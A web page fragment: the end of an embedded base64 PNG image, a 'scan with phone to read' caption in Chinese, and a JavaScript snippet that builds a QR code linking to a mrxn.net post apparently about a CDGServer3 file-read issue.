jwnZLswov4ZwrwPotsPj3nPQfJwRzMd+/ek33XIrO7DqMOcQ3QI9jnyGV6fkNlTeaO2LcS3BLJVCPazmeu4yq10mM83D6MP4f2+e26vqAfphRH1zYvqkLy6qC+qi13v3BxkPtxxW4ihC9/7BLaFQLbkcfpW5ZAcBM2/is4TIfPkz86D9MH9/5Cs9/aZckivefUVV4exT12E+M6D8O7LzRVuC9G88L1P4HQhtbUqj1nXVXIYt6/esXqqug7pL68KwntODvEhWD0WjJo9HSE5dQiHOZrzPqK6uNL1O5qH+31PF9KHXPy/fQLbT+puq98O7tuD+7W53gf3DNyvzcNdg+Pf953X0f5HaI8ZyL3k3VcXz3xzkLkQtA/CzXWE+I/y1yekP7U38+0ndcj2+nnc5grNd7/rkPk9B9HNizDqvU8OycEdndERklF3hhzid11f1Bdh3gdz3TmicwqvT4hP5UNwW0htZ1+eD7JleIw9L+8ImdP1VzlkzuzMfRYcs9XXc6VVdR3S33V59VStOKS/MlXmRIgPXP8K9/ZhX9snxHPBfVtw/1NQbXZW9j2LzljlIfc3B+EQtG/md00u2vss2ifCeAYIhxH7fPvVIXm5fuFhIYYufM8TOCyktlTlcSDbhDlWtgri1/W+nKMmh+TlryKs+70XJANB7wHhEDTf/c57Tn+FPQ+5n/nul35YSIlXve8JbD+pewQYt6guzrZanjqM/TDn5qu3CpJTh/Dy9gXRzYmF+1xdl7YvSG95VXp1XQXxu15eFcSHYGlV5kWID8HKzAqO/vUJmT2pN2rbQiDbcsueSS5CcvorhOTsW+W6D2Nf9zuH5OGO3guiyZ9FSB8E7fPeojqMOXVzEF++8oHr55Dbh31tn5B+rr5NmG/52T5zZ3PPfOdAziMv7L1yOGYrD9EhWNqs+hwY8/q9F8ac/ipf/nIhZV7180/g5YXAuHV4zH0bYMz5rerLITkIqosw1/W/g55BXM3ofueQs3VdDvFhRP3ClxeyOuyl/5kncFgIjNvzNrW9fal3NKMOmScXIToE1VcIyTlfXOVnuj0dIbMh2P0+S/9ZHTLXfO+H+MD1p6zbh31t/8awn6tvUR+yTbkIo77qN7/Csz7IfSC4nwPRILj3Ztdwlhu7IHkI6kI4jKi/Qr/XPR7+lrVqvvSfeQLb77L2W6rr1e3L21fPQd6SrtsDo6/e8/KVrz5DeztC7g3BWW9pEB9GdF5lqiB+18vbl74IYx+EA9c/Q24f9rX9MwTuW4Lz67PvAzLDN+Us3/3e17l5yH0ApSU6QzQIfP2PQeXd73yVU4dxnrroPDjmrn+G+JQ+BLeFuLUz7Oc2r965+rMIeWtgjn2O9yvsHmRGeVXd7xySh2D1VEF4z6949VSt/Ef6tpBHocv7uSdwWAjkbYARz45Ub0QVpK+uqyAcgqXtq8/de3XdfTlkHhzRTPVXyVdYmVlBZncPovd5EB1G7LlH/LCQR+HL+++fwG8vBB6/Df3t8luC9D3L+5xnuLNFGO+pLsJzvveG5OWi8zrqq3de+m8vpIZc9eeewB9biNsWIW8PBD0yhJtTP+PmHiFkthkIh2C/B0SHoD6EO0fUl4sw5lc58x3NF/6xhfSbXPx7T+CwkNrSrFbjzcL8LdG3Xw7JQ1BfhFGHx7z6nF3XVXIRxhmVeVT29Qxkjr4I0c2ri+ow5tQLDwsp8ar3PYFtIZCtwWNcHXX1FkDm2QcjP9OdK5qXQ+YBWgcEht9Vwcid1RshORhxletzIH3mYc4hOnD9tvf2YV/bJ+TDzvW/Pc4/AAAA//+Ana0VAAAABklEQVQDACD3m8XfYMTrAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/CDGServer3-DecryptApplication-file\_read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 